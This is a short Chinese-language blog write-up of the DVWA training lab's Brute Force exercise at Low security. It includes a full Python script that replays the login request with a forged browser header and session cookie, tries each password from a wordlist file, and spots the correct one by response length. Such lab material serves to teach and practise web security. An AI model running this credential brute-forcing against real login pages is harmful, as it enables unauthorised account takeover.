DVWA - Brute Force(暴力破解)

ZeroY · 2021-11-14 · 次阅读

Brute Force(暴力破解)

Low

思路

通过f12抓取登录请求，采用python伪造登录请求并使用密码词典进行爆破

代码

import requests

def sendRequest(pwd):
    url = f"http://172.19.11.99:10000/vulnerabilities/brute/?username=admin&password={pwd}&Login=Login"
    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44",
        "Cookie": "PHPSESSID=ae3npqpju89qcdis5lgjve8lbg; security=low"
    }  # 伪造请求头  模拟浏览器携带cookie发送请求
    response = requests.get(url, headers=headers)  # 使用requests发送get请求
    print(f"{pwd}: {len(response.content)}")  # 输出响应长度


if __name__ == '__main__':
    passList = open("./password.txt", "r").read().splitlines()  # 读取密码列表 按行切割成列表
    for password in passList:  # 遍历密码列表 逐个爆破
        sendRequest(password)

结果

通过对比输出的响应长度，长度与其他不同的那一个极有可能是正确的密码
